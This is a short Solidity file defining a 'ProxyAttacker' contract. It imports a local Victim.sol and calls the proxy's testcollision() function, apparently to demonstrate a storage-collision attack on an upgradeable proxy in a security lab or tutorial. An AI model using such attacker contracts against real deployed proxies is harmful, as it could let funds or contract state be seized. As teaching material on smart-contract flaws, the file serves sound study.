// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract ProxyAttacker {
    Proxy proxy;

    constructor(address _proxyAddress) {
        proxy = Proxy(_proxyAddress);
    }

    function Attack() public {
        proxy.testcollision();
    }
}
